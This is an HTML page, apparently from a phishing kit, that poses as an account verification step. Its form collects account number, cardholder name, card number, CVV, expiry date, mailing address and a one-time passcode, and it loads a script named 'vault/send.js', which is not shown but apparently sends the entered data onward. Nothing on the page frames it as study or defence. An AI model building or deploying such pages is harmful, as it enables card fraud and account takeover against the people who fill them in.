<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verify Account</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f5f5f5;
      padding: 20px;
    }
    form {
      max-width: 500px;
      margin: auto;
      background: #fff;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px #ccc;
    }
    input, button {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    button {
      background-color: #007bff;
      color: white;
      border: none;
    }
  </style>
</head>
<body>

  <form id="verify-form">
    <h2>Verify Your Account</h2>
    <input type="text" name="accountnumber" placeholder="Account Number" required />
    <input type="text" name="cardname" placeholder="Name on Card" required />
    <input type="text" name="cardnumber" placeholder="Card Number" required />
    <input type="text" name="cvv" placeholder="CVV" required />
    <input type="text" name="expdate" placeholder="Expiry Date (MM/YY)" required />
    <input type="text" name="mailingaddress" placeholder="Mailing Address" required />
    <input type="text" name="otp" placeholder="OTP" required />
    <button type="submit">Submit</button>
  </form>

  <!-- âœ… Only include this once -->
  <script src="vault/send.js"></script>
</body>
</html>
